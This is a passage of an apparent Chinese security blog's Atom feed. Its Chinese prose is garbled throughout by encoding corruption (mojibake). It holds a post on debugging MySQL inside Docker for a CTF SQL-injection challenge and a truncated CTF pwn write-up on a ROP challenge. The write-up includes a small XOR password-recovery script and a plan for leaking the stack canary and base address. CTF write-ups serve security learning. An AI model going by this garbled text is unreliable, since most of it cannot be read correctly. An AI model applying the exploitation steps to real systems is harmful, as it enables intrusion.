·è§£é¢˜ã€‹å’Œè´¹æ›¼çš„ã€Šç‰©ç†å­¦è®²ä¹‰ã€‹ã€‚ä¸€æœ¬ä¹¦æ˜¯å¯¹è§£é¢˜æ€ç»´è¿‡ç¨‹çš„ç†è§£ï¼Œå¦å¤–ä¸€æœ¬ä¹¦æ˜¯è‘—åçš„ç‰©ç†å­¦å®¶è´¹æ›¼çš„ç‰©ç†è®²ä¹‰ï¼Œæƒ³è¦äº†è§£ä»€ä¹ˆä¹¦æ‰æ˜¯å¥½ä¹¦ï¼ŒæŠŠç§‘å­¦çš„æ¦‚å¿µå’Œç”Ÿæ´»è”ç³»åœ¨ä¸€èµ·ï¼Œè€Œä¸æ˜¯æ¯ç‡¥çš„é˜è¿°å’Œæ¨ç†ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¸€å¼€å§‹åªæ˜¯æŠ±ç€å¼€é˜”è§†é‡çš„å¿ƒæ€æ¥çš„ï¼Œæƒ³ç€ç®—æ³•æ˜¯ITè¡Œä¸šå“ªé‡Œéƒ½ä¼šç”¨åˆ°çš„ä¸œè¥¿ï¼Œå­¦å®Œä¹‹åè§‰å¾—åœè€å¸ˆä¸æ„§æ˜¯æ•™äº†13å¹´çš„è€å¸ˆï¼Œå¾ˆå¤šåœ°æ–¹éƒ½å¾ˆå—ç›Šï¼Œè™½ç„¶ä¸æ˜¯ä¸“é—¨åšç®—æ³•çš„ï¼Œå…¶ä¸­çš„å¾ˆå¤šæ€æƒ³éƒ½å¯¹ä»¥åçš„å·¥ä½œæœ‰ä¸€å®šå¯å‘ã€‚&lt;/p&gt;
&lt;h2 id=&quot;è§‚å¯Ÿé—®é¢˜çš„è§’åº¦&quot;&gt;&lt;a href=&quot;#è§‚å¯Ÿé—®é¢˜çš„è§’åº¦&quot;
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ç®—æ³•" scheme="https://hurricane618.me/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Dockerä¸­çš„Mysqlé…ç½®é—®é¢˜å¤„ç†ä¸æ€è€ƒ</title>
    <link href="https://hurricane618.me/2019/11/27/docker-mysql-problem-check/"/>
    <id>https://hurricane618.me/2019/11/27/docker-mysql-problem-check/</id>
    <published>2019-11-27T15:07:33.000Z</published>
    <updated>2019-11-27T16:01:02.987Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹ï¼Œæˆ‘åœ¨dockerå®¹å™¨ä¸­é…ç½®Mysqlæ—¶é‡åˆ°çš„å‘ï¼Œä»¥åŠå¤„ç†è¿‡ç¨‹ä¸­å­¦åˆ°çš„çŸ¥è¯†ã€‚</p><h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p>æœ€è¿‘ä½œä¸šé‡å¤šï¼Œä»»åŠ¡é‡ç»“æœè¿˜æ˜¯è¢«ç‚¹åå‡ºé¢˜ï¼ˆå“­å”§å”§ï¼‰ï¼Œæ²¡åŠæ³•åªèƒ½ç¡¬ç€å¤´çš®ä¸Šã€‚æœ‰äº†å‡ºé¢˜æ€è·¯ä¹‹åï¼Œå’Œ<code>@wh1t3Pig</code>äº¤æµä¹‹åå¾—çŸ¥éœ€è¦ä½¿ç”¨<code>docker-compose</code>æ¥å¸ƒç½®å‡ºé¢˜ç¯å¢ƒã€‚å•¥ï¼Ÿå§æ§½ï¼Ÿä¸èƒ½æ‰‹åŠ¨å¸ƒç½®å—ï¼Ÿç®—äº†ï¼Œå°±å½“åšæ˜¯å¯¹æˆ‘çš„è€ƒéªŒã€‚æ‰€ä»¥æˆ‘å¼€å¼€å¿ƒå¿ƒçš„å†™å¥½æºæ–‡ä»¶ä¹‹åï¼Œå¼€å§‹å‡†å¤‡å¸ƒç½®ç¯å¢ƒï¼Œé‚£ä¹ˆåˆ°åº•æ˜¯ç›´æ¥æ‹‰ä¸ªMysqlï¼Œè¿˜æ˜¯ç›´æ¥åœ¨å®¹å™¨å†…éƒ¨è£…ï¼Ÿåœ¨å†…éƒ¨è£…åˆæœ‰å„ç§é—®é¢˜ã€‚ã€‚ã€‚è¿™é‡Œå°±æŠŠè¿™äº›å‘è®°å½•ä¸‹æ¥é€ ç¦åäººï¼ŒåŒæ—¶ä¹Ÿæœ‰ä¸€å®šçš„åˆ†æã€‚</p><h2 id="web-server-mysql-or-in-one-containerï¼Ÿ"><a href="#web-server-mysql-or-in-one-containerï¼Ÿ" class="headerlink" title="web server+mysql or in one containerï¼Ÿ"></a>web server+mysql or in one containerï¼Ÿ</h2><p>åœ¨å‚è€ƒå¤šä¸ªçŸ¥åé¡¹ç›®å’Œæ¯”èµ›é¢˜ç›®çš„<code>Dockerfile</code>ï¼Œ<code>docker-compose.yml</code>ï¼Œ<code>start.sh</code>ä¹‹åï¼Œæ¯…ç„¶å†³å®šä½¿ç”¨æŠŠæœåŠ¡å…¨éƒ¨è£…è¿›ä¸€ä¸ªå®¹å™¨çš„æ€è·¯ã€‚</p><p>ä¸ºä»€ä¹ˆï¼Ÿè€ƒè™‘æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li>æˆ‘å‡ºçš„é¢˜ç›®æ˜¯SQLiï¼Œéœ€è¦æå‰åœ¨æ•°æ®åº“ä¸­æ’å…¥æ•°æ®ï¼Œç„¶è€Œä½¿ç”¨ç›´æ¥æ‹‰ä¸€ä¸ªMysqlçš„æ–¹å¼ï¼Œéå¸¸ä¸æ–¹ä¾¿ï¼Œå¦‚æœè¦æ’å…¥æ•°æ®å¿…é¡»è¦å†å†™ä¸€ä¸ªé’ˆå¯¹Mysqlçš„<code>Dockerfile</code>ï¼Œé‚£è¿™æ ·è¿˜ä¸å¦‚ç›´æ¥æ”¾åœ¨ä¸€èµ·ã€‚</li><li>è¿™é“é¢˜çš„æ•°æ®åº“å’Œå…¶ä»–é¢˜ç›®ä¸å…±äº«ï¼Œå•ç‹¬æ‹‰ä¸€ä¸ªçš„æ„ä¹‰ä¸å¤§ã€‚</li><li>å¦‚æœä»¥åè¦å¤šèŠ‚ç‚¹éƒ¨ç½²è¿™ç§é¢˜ç›®ï¼Œæ•°æ®åº“ç‹¬ç«‹çš„è¯èƒ½é¿å…é˜Ÿä¼ä¹‹é—´æ…å±ã€‚</li></ol><p>æ³¨ï¼šè¦æ˜¯æœ‰å¸ˆå‚…èƒ½æœ‰æ›´å¥½çš„è§£å†³æ–¹æ¡ˆï¼Œæ¬¢è¿äº¤æµã€‚</p><h2 id="Mysqlçš„å®‰è£…äº¤äº’é—®é¢˜"><a href="#Mysqlçš„å®‰è£…äº¤äº’é—®é¢˜" class="headerlink" title="Mysqlçš„å®‰è£…äº¤äº’é—®é¢˜"></a>Mysqlçš„å®‰è£…äº¤äº’é—®é¢˜</h2><p>é‚£ä¹ˆé‡‡ç”¨äº†æœåŠ¡è£…è¿›ä¸€ä¸ªå®¹å™¨é‡Œé¢ä¹‹åï¼Œå‘ç°äº†å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œ<code>apt-get install mysql-server</code>è¿™ä¸ªå®‰è£…æ˜¯éœ€è¦äº¤äº’çš„ï¼Œé€”ä¸­è¦æ±‚ä½ è®¾ç½®rootçš„å¯†ç ã€‚è¿™ä¸ªæ²¡æœ‰åŠæ³•ç”¨<code>-y</code>é€‰é¡¹å›é¿æ‰ã€‚ä¸€é¡¿æœç´¢ä¹‹åï¼Œåœ¨stackoverflowä¸­çœ‹åˆ°å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç¯å¢ƒå˜é‡<code>DEBIAN_FRONTEND=noninteractive</code>æ¥è·³è¿‡äº¤äº’ã€‚</p><p>è¿™æ ·æˆ‘ä»¬åœ¨<code>Dockerfile</code>ä¸­</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"><span class="keyword">RUN</span> apt-get update &amp;&amp; apt-get install -y mysql-server &amp;&amp; apt-get clean</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥å®Œç¾è§£å†³äº¤äº’é—®é¢˜ã€‚</p><h2 id="phpä¸­çš„mysqlæ‰©å±•å®‰è£…é¡ºåºé—®é¢˜"><a href="#phpä¸­çš„mysqlæ‰©å±•å®‰è£…é¡ºåºé—®é¢˜" class="headerlink" title="phpä¸­çš„mysqlæ‰©å±•å®‰è£…é¡ºåºé—®é¢˜"></a>phpä¸­çš„mysqlæ‰©å±•å®‰è£…é¡ºåºé—®é¢˜</h2><p>é¢˜ç›®ä½¿ç”¨çš„æ˜¯mysqlæ‰©å±•ï¼Œè‡ªå¸¦çš„phpæ²¡æœ‰ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦<code>docker-php-ext-install mysql</code>ã€‚ä½†æ˜¯äº‹æ•…å‘ç”Ÿäº†ï¼Œæˆ‘åœ¨æ‰‹åŠ¨æ“ä½œçš„æ—¶å€™æ˜¯å¯ä»¥æˆåŠŸçš„ï¼Œä½†æ˜¯è‡ªåŠ¨åŒ–çš„æ—¶å€™è¿æ¥æŠ¥é”™<code>No such file or directory</code>ï¼Œå½“æ—¶æˆ‘ç«‹å³ä½¿ç”¨Mysqlçš„å®¢æˆ·ç«¯å°è¯•è¿æ¥ï¼Œç»“æœæ˜¯æˆåŠŸçš„ï¼Œæ’é™¤äº†ç”¨æˆ·åå’Œå¯†ç é—®é¢˜ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä¸ºä»€ä¹ˆMysqlå®¢æˆ·ç«¯å¯ä»¥è¿æ¥æˆåŠŸï¼Œphpçš„è¿æ¥å‡½æ•°å°±ä¸è¡Œã€‚</p><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°æœ‰å…³åˆ†æï¼Œä½¿ç”¨<code>strace</code>åˆ†æä¹‹åå‘ç°ï¼Œphpè¿æ¥å‡½æ•°ä½¿ç”¨çš„æ˜¯<code>unixdomain socket</code>ï¼ŒåŒæ—¶è®¿é—®çš„æ˜¯<code>/tmp/mysql.sock</code>ï¼Œè¿™é‡Œæ²¡æœ‰è¿™ä¸ªsocketæ–‡ä»¶ï¼Œå¯¼è‡´æŠ¥å‡ºæ²¡æœ‰æ–‡ä»¶çš„é”™è¯¯ã€‚ç»“åˆå…¶ä»–èµ„æ–™ï¼Œå½“ä½¿ç”¨<code>localhost</code>è¿›è¡Œè¿æ¥çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨<code>unixdomain</code>çš„æ–¹å¼ã€‚è¿™ä¸ª<code>/tmp/mysql.sock</code>åˆ™æ˜¯ç”±äºphpæ²¡æœ‰è®¾ç½®mysqlçš„é»˜è®¤socketï¼Œå†™æ­»åœ¨æºç ä¸­çš„é»˜è®¤å€¼ã€‚</p><p>ä½†æ˜¯è¿™å°±å¥‡æ€ªäº†ï¼Œæˆ‘åœ¨æ‰‹åŠ¨æ“ä½œæ—¶ï¼Œä¹Ÿæ˜¯é€šè¿‡dockerè‡ªå¸¦çš„å®‰è£…ç¨‹åºå®‰è£…æ‰©å±•çš„ã€‚æ€è€ƒä¹‹åï¼Œå‘ç°å‘½ä»¤çš„æ‰§è¡Œé¡ºåºä¸åŒï¼Œåœ¨æ‰‹åŠ¨é…ç½®æ—¶ï¼Œæˆ‘æ˜¯å…ˆå®‰è£…Mysqlï¼ŒåŒæ—¶å¼€å¯æœåŠ¡ä¹‹åæ‰å®‰è£…çš„æ‰©å±•ã€‚é‚£ä¹ˆæ¥å¯¹æ¯”ä¸€ä¸‹ï¼Œä¸åŒçš„é¡ºåºphpçš„é…ç½®ä¼šæœ‰ä»€ä¹ˆä¸åŒã€‚</p><p>å…ˆå®‰è£…æ‰©å±•ï¼Œåå¼€å¯æœåŠ¡ã€‚</p><img src="/2019/11/27/docker-mysql-problem-check/1.png"><p>çœ‹åˆ°è¿™é‡Œæ˜¯æ²¡æœ‰è®¾ç½®çš„çŠ¶æ€ï¼Œå…ˆå¼€å¯MysqlæœåŠ¡ï¼Œå†å®‰è£…æ‰©å±•ã€‚</p><img src="/2019/11/27/docker-mysql-problem-check/2.png"><p>çœ‹åˆ°è¿™é‡Œçš„é»˜è®¤socketå·²ç»è®¾ç½®äº†ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨å®‰è£…æœåŠ¡ç±»å‹çš„æ‰©å±•æ—¶ï¼Œè¦å…ˆå¼€å¯æœåŠ¡ï¼Œå†å®‰è£…æ‰©å±•ã€‚</p><h2 id="Mysqlåœ¨dockerä¸­çš„æœåŠ¡å¼€å¯é—®é¢˜"><a href="#Mysqlåœ¨dockerä¸­çš„æœåŠ¡å¼€å¯é—®é¢˜" class="headerlink" title="Mysqlåœ¨dockerä¸­çš„æœåŠ¡å¼€å¯é—®é¢˜"></a>Mysqlåœ¨dockerä¸­çš„æœåŠ¡å¼€å¯é—®é¢˜</h2><p>è¿™åˆæ˜¯ä¸ªè¯¡å¼‚çš„é—®é¢˜ï¼Œå’Œä¸Šä¸ªé—®é¢˜ä¸€æ ·ï¼Œåœ¨æ‰‹åŠ¨æ“ä½œçš„æ—¶å€™<code>service mysql start</code>ä¸€ç‚¹æ¯›ç—…æ²¡æœ‰ï¼Œåœ¨è‡ªåŠ¨åŒ–çš„æ—¶å€™å°±ç‚¸ã€‚å”¯ä¸€çš„åŒºåˆ«æ˜¯ä¸­é—´çš„äº¤äº’è¿‡ç¨‹ï¼Œæ‰‹åŠ¨æ“ä½œæ˜¯ç”±äº¤äº’ï¼Œè‡ªåŠ¨åŒ–æ˜¯æ— äº¤äº’ã€‚æŸ¥è¯¢æ—¥å¿—å¾—åˆ°<code>[ERROR] Fatal error: Can&#39;t open and lock privilege tables: Got error 140 from storage engine</code>ã€‚è®©äººæ‘¸ä¸ç€å¤´è„‘ï¼Œåªèƒ½æ²¿ç€è¿™æ¡çº¿ç»§ç»­æ·±å…¥ã€‚</p><p>è¿™ä¸ªé—®é¢˜å‘ç”Ÿåœ¨å¾ˆå¤šç”¨Dockerfileæ¥buildçš„å®¹å™¨ä¸Šï¼Œåœ¨githubçš„issueä¸Šä¹Ÿæ‰¾åˆ°ä¸€äº›é—®é¢˜çš„å›ç­”ã€‚æ‰¾åˆ°çš„å…¶ä¸­ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯åœ¨<code>docker-compose.yml</code>æ–‡ä»¶ä¸­åŠ ä¸Š<code>volumes:(æ¢è¡Œ) - /var/lib/mysql</code>ï¼Œæˆ‘å¾ˆå¥½å¥‡æ˜¯ä»€ä¹ˆæœºåˆ¶å¯¼è‡´å¿…é¡»è¦æ‰‹åŠ¨åœ¨å®¹å™¨å†…éƒ¨æŒ‚è½½ã€‚</p><p>æœ‰äº›issueä¸­æèµ·ç°åœ¨dockerçš„å†…éƒ¨æ–‡ä»¶ç³»ç»Ÿå·²ç»ä»<code>aufs</code>å˜æˆäº†<code>overlay</code>å’Œ<code>overlay2</code>ï¼ŒMysqlå¯åŠ¨å‡ºç°é—®é¢˜çš„éƒ½æ˜¯ä»¥<code>overlay</code>ç³»åˆ—ä¸ºæ–‡ä»¶ç³»ç»Ÿçš„dockerã€‚æœ€åæ‰¾åˆ°äº†dockeråœ¨<code>overlay2</code>çš„æ–‡æ¡£ä¸­çš„ä¸€æ®µå¯¹æ‰“å¼€æ–‡ä»¶æ“ä½œçš„æè¿°ã€‚</p><blockquote><p>open(2): OverlayFS only implements a subset of the POSIX standards. This can result in certain<br>OverlayFS operations breaking POSIX standards. One such operation is the copy-up operation. Suppose that your application calls fd1=open(â€œfooâ€, O_RDONLY) and then fd2=open(â€œfooâ€, O_RDWR). In this case, your application expects fd1 and fd2 to refer to the same file. However, due to a copy-up operation that occurs after the second calling to open(2), the descriptors refer to different files. The fd1 continues to reference the file in the image (lowerdir) and the fd2 references the file in the container (upperdir). A workaround for this is to touch the files which causes the copy-up operation to happen. All subsequent open(2) operations regardless of read-only or read-write access mode will be referencing the file in the container (upperdir).</p><p>yum is known to be affected unless the yum-plugin-ovl package is installed. If the yum-plugin-ovl package is not available in your distribution such as RHEL/CentOS prior to 6.8 or 7.2, you may need to run touch /var/lib/rpm/* before running yum install. This package implements the touch workaround referenced above for yum.</p></blockquote><p>å¤§ä½“çš„æ„æ€å°±æ˜¯ï¼Œæ–°çš„<code>overlay</code>æ–‡ä»¶ç³»ç»Ÿä»…ä»…åªå®ç°äº†<code>POSIX</code>æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œè¿™å°±å¯¼è‡´æŸäº›æ“ä½œä¼šæœ‰å¼‚å¸¸ï¼Œæ¯”å¦‚ä»¥ä¸¤ç§ä¸åŒçš„æ‰“å¼€æ ‡å‡†æ“ä½œåŒä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œå°±ä¼šè®©å…¶ä¸­çš„ä¸€äº›æ“ä½œæ˜¯é’ˆå¯¹é•œåƒä¸­çš„æ–‡ä»¶ï¼Œå¦å¤–ä¸€äº›æ˜¯é’ˆå¯¹å®¹å™¨ä¸­çš„æ–‡ä»¶ï¼Œè¿™æ ·æˆ‘ä»¬çš„åº”ç”¨æœ¬è¯¥æ˜¯åªèƒ½æ§åˆ¶å®¹å™¨å†…çš„æ–‡ä»¶ï¼Œå´å¯¹é•œåƒä¸­çš„è¿™ä¸ªæ–‡ä»¶æœ‰æ“ä½œï¼Œä»è€Œå‡ºç°å¼‚å¸¸ã€‚é‡Œé¢ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆæ˜¯åœ¨å¯åŠ¨æˆ‘ä»¬çš„æœåŠ¡åº”ç”¨ä¹‹å‰ï¼ŒæŠŠéœ€è¦æ“ä½œçš„æ–‡ä»¶å…¨éƒ¨<code>touch</code>ä¸€éã€‚</p><p>æ‰€ä»¥ç¬¬äºŒç§è§£å†³æ–¹æ¡ˆæ˜¯åœ¨å¯åŠ¨æœåŠ¡ä¹‹å‰å…¨éƒ¨<code>touch</code>ä¸€é<code>find /var/lib/mysql -type f -exec touch {} \;</code>ã€‚ä½†æ˜¯äº‹æƒ…è¿˜æ²¡å®Œï¼Œä¸ºä»€ä¹ˆåœ¨docker buildçš„é˜¶æ®µä¼šè¿™æ ·ï¼Œè€Œæˆ‘ä»¬æ‰‹åŠ¨æ“ä½œçš„æ—¶å€™ä¸ä¼šå‡ºç°ï¼Œç­”æ¡ˆå·²ç»å¾ˆæ˜æ˜¾äº†ã€‚åªæœ‰åœ¨docker buildçš„é˜¶æ®µæ‰ä¼šæœ‰å¯èƒ½äº§ç”Ÿå¯¹é•œåƒå†…çš„æ–‡ä»¶æ“ä½œï¼Œä½†æ˜¯æˆ‘ä»¬æ‰‹åŠ¨æ‰§è¡Œæ—¶å·²ç»æ˜¯ç¡®ç¡®å®å®çš„åœ¨å®¹å™¨ä¸­äº†ï¼Œä¹Ÿå°±åªèƒ½æ“ä½œå®¹å™¨å†…çš„æ–‡ä»¶ï¼Œç±»ä¼¼<code>open(2)</code>çš„æ“ä½œå¯¹é•œåƒä¸­çš„æ–‡ä»¶ä¸ä¼šæœ‰å¹²æ‰°ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é‡åˆ°æŸäº›å¥‡æ€ªçš„ç°è±¡ä¸è¦åœç•™åœ¨è¡¨è±¡ï¼Œè¦çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œä¸è¦æƒ³å½“ç„¶ã€‚å…¶æ¬¡ï¼Œè¿™æ¬¡çš„æƒ…å†µå°±å¯ä»¥çœ‹å‡ºä¸­æ–‡èµ„æ–™éå¸¸æœ‰é™ï¼Œæ‰€ä»¥ç”¨è‹±æ–‡æœç´¢æ˜¯ä¸€ç§å¿…å¤‡æŠ€å·§ã€‚æœ€åï¼Œå®˜æ–¹æ–‡æ¡£æ˜¯ä¸€ä¸ªå®è—ï¼Œé‡åˆ°é¡¹ç›®é—®é¢˜å¯èƒ½æ–‡æ¡£ä¸­å°±æœ‰ç­”æ¡ˆã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://stackoverflow.com/questions/38165407/installing-lightdm-in-dockerfile-raises-interactive-keyboard-layout-menu" target="_blank" rel="noopener">https://stackoverflow.com/questions/38165407/installing-lightdm-in-dockerfile-raises-interactive-keyboard-layout-menu</a></p><p><a href="https://my.oschina.net/scgywx/blog/1545301" target="_blank" rel="noopener">https://my.oschina.net/scgywx/blog/1545301</a></p><p><a href="https://github.com/geerlingguy/drupal-vm/issues/1497" target="_blank" rel="noopener">https://github.com/geerlingguy/drupal-vm/issues/1497</a></p><p><a href="https://github.com/docker/for-linux/issues/72" target="_blank" rel="noopener">https://github.com/docker/for-linux/issues/72</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è®°å½•ä¸€ä¸‹ï¼Œæˆ‘åœ¨dockerå®¹å™¨ä¸­é…ç½®Mysqlæ—¶é‡åˆ°çš„å‘ï¼Œä»¥åŠå¤„ç†è¿‡ç¨‹ä¸­å­¦åˆ°çš„çŸ¥è¯†ã€‚&lt;/p&gt;
&lt;h2 id=&quot;èµ·å› &quot;&gt;&lt;a href=&quot;#èµ·å› &quot; class=&quot;headerlink&quot; title=&quot;èµ·å› &quot;&gt;&lt;/a&gt;èµ·å› &lt;/h2&gt;&lt;p&gt;æœ€è¿‘ä½œä¸šé‡å¤šï¼Œä»»åŠ¡é‡ç»“æœè¿˜æ˜¯è¢«ç‚¹åå‡ºé¢˜ï¼ˆ
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="docker" scheme="https://hurricane618.me/tags/docker/"/>
    
      <category term="Mysql" scheme="https://hurricane618.me/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>CNSSæ‹›æ–°é¢˜ä¸­çš„ä¸€é“ROPé¢˜</title>
    <link href="https://hurricane618.me/2019/11/11/cnss-recruit-pwn-1/"/>
    <id>https://hurricane618.me/2019/11/11/cnss-recruit-pwn-1/</id>
    <published>2019-11-11T02:34:09.000Z</published>
    <updated>2019-11-11T02:37:05.600Z</updated>
    
    <content type="html"><![CDATA[<p>CNSSæ‹›æ–°é¢˜ç›®ä¸­æœ‰ä¸¤é“ä¸é”™çš„Pwné¢˜ï¼Œæ‹¿æ¥å­¦ä¹ ä¸€æ³¢çŸ¥è¯†ã€‚ç„¶è€Œå…¶ä¸­æœ‰ä¸€é“æ˜¯å†…æ ¸ROPï¼Œå¤ç°äº†å¥½å‡ å¤©ã€‚ã€‚è¿˜æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œå†åŠ ä¸Šç ”ç©¶ç”Ÿå¤§ä½œä¸šé›†ç¾¤æ¥äº†ï¼ˆå®Œå…¨ä¸èƒ½æ‘¸é±¼ï¼Œå“­å”§å”§ï¼‰ï¼Œæ‰€ä»¥é‚£é“å†…æ ¸é¢˜èƒ½åšå‡ºæ¥å°±æ”¾åšå®¢ã€‚</p><h2 id="Sleepy-Server"><a href="#Sleepy-Server" class="headerlink" title="Sleepy Server"></a>Sleepy Server</h2><p>è¿™é“é¢˜checksecå‘ç°é˜²å¾¡å…¨å¼€ï¼ŒåŒæ—¶ç»™äº†libseccompï¼Œçœ‹æ¥æ˜¯å¯¹libcçš„è°ƒç”¨æœ‰ä¸€å®šé™åˆ¶ã€‚</p><img src="/2019/11/11/cnss-recruit-pwn-1/1.png"><p>å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†execveï¼Œä¸èƒ½é€šè¿‡ç›´æ¥æ‹¿shellè·å¾—flagã€‚å¼€å§‹åˆ†ææ•´ä¸ªç¨‹åºï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆåˆ©ç”¨ç‚¹ã€‚</p><img src="/2019/11/11/cnss-recruit-pwn-1/2.png"><p>æ¯”è¾ƒå®¹æ˜“çš„å°±èƒ½çœ‹åˆ°<code>buf</code>æœ‰ä¸€ä¸ªæº¢å‡ºï¼Œä½†æ˜¯æº¢å‡ºçš„æ•°é‡æœ‰é™åªæœ‰0x10å­—èŠ‚ï¼Œéšåçœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç è¢«ä¼ å…¥ä¸€ä¸ªå‡½æ•°åˆ¤æ–­ï¼Œåˆ¤æ–­çš„ç»“æœæ­£ç¡®æ‰ä¼šè¿›å…¥æ¼æ´ç‚¹ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›<code>sub_E9D</code>å‡½æ•°ã€‚</p><img src="/2019/11/11/cnss-recruit-pwn-1/3.png"><p>åœ¨è¿™é‡Œæˆ‘ä»¬å‘ç°åªå¯¹<code>a2</code>æœ‰ç›¸å…³æ“ä½œï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å¯†ç ã€‚é¦–å…ˆä¸€ä¸ªä¸´æ—¶æ•°ç»„ä¿å­˜<code>v3 ^ a2[i]</code>çš„æ•°æ®ï¼Œå¹¶ä¸”å°†è¿™ä¸ªæ•°æ®æ›´æ–°åˆ°<code>v3</code>ä¸Šã€‚ä¹Ÿå°±æ˜¯è¯´æ¯æ¬¡å¼‚æˆ–æ“ä½œéƒ½æ˜¯å’Œä¸Šä¸€è½®å¼‚æˆ–çš„ç»“æœå’Œè¿™è½®çš„å­—ç¬¦ï¼ŒåŒæ—¶ä¸´æ—¶ä¿å­˜çš„æ¯è½®å¼‚æˆ–æ•°æ®è¦å’Œ<code>v8</code>å¼€å§‹çš„ä¸€ç³»åˆ—å€¼ç›¸ç­‰ã€‚</p><p>ä»ä¸Šé¢çœ‹ä¸€å…±æœ‰12ä¸ªå€¼ï¼Œé‚£ä¹ˆå¯†ç çš„é•¿åº¦è‚¯å®šæ˜¯12ï¼Œè¿™æ ·æˆ‘ä»¬æœ‰æ¯è½®å¼‚æˆ–æœ€åçš„ç»“æœå¯ä»¥å¼‚æˆ–æ“ä½œé€†æ¨å›å»ã€‚åŸå§‹è¾“å…¥çš„ç»“æœå°±ç­‰äºè¿™è½®å¼‚æˆ–ç»“æœä¸ä¸Šä¸€è½®å¼‚æˆ–ç»“æœç›¸å¼‚æˆ–ï¼Œç„¶åç¬¬ä¸€è½®æ˜¯è¿™è½®ç»“æœä¸0å¼‚æˆ–å¾—åˆ°ã€‚è§£å¯†ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">115</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">18</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">9</span>, <span class="number">122</span>, <span class="number">14</span>, <span class="number">107</span>, <span class="number">27</span>]</span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    passwd += chr(i ^ v3)</span><br><span class="line">    v3 = i</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> passwd</span><br></pre></td></tr></table></figure><p>æœ€åæ‹¿åˆ°çš„å¯†ç æ˜¯<code>step_by_step</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½é¡ºåˆ©è¿›å…¥æ¼æ´è§¦å‘ç‚¹äº†ã€‚</p><p>æˆ‘ä»¬ç»§ç»­çœ‹<code>main</code>å‡½æ•°ï¼ŒåŒæ ·å¾ˆå®¹æ˜“å‘ç°æœ‰ä¸¤æ¬¡<code>printf</code>ï¼Œç”±äºç¨‹åºæ˜¯å¼€å¯äº†<code>canary</code>ä¿æŠ¤çš„ï¼Œæˆ‘ä»¬éœ€è¦å…ˆæ³„éœ²æ‰è¡Œï¼Œè€Œè¿™é‡Œæœ‰ä¸¤æ¬¡è¾“å‡ºï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡è¾“å‡ºå°±æ˜¯ä¸ºäº†æ³„éœ²æ•°æ®ã€‚æœ€å8ä¸ªå­—èŠ‚ä¸º<code>canary</code>ï¼Œé€šå¸¸è¿™ä¸ªå€¼çš„æœ€ä½ä½ä¸º0ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯åªéœ€è¦æŠŠè¿™ä¸ª0è¦†ç›–æ‰ï¼Œå°±èƒ½è®©<code>printf</code>æŠŠåé¢çš„<code>canary</code>å’Œ<code>rbp</code>ä¸€èµ·è¾“å‡ºã€‚æœ‰äº†<code>rbp</code>çš„æ•°æ®æˆ‘ä»¬èƒ½é€šè¿‡è°ƒè¯•çŸ¥é“è¿™ä¸ª<code>rbp</code>å’Œç¨‹åºçš„èµ·å§‹åœ°å€çš„å·®å€¼ï¼Œä»è€Œå¾—åˆ°ç¨‹åºçš„èµ·å§‹åŸºåœ°å€ï¼Œä»è€ŒåŒæ—¶è§£å†³äº†åœ°å€éšæœºåŒ–çš„é—®é¢˜ã€‚</p><p>ç°åœ¨ç›®å…‰é›†ä¸­åœ¨ä¸‹ä¸€æ¬¡è¾“å…¥çš„æº¢å‡ºä¸Šï¼Œè¿™é‡Œåªèƒ½æº¢å‡º16å­—èŠ‚ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªèƒ½è¦†ç›–<code>rbp</code>å’Œ<code>ret_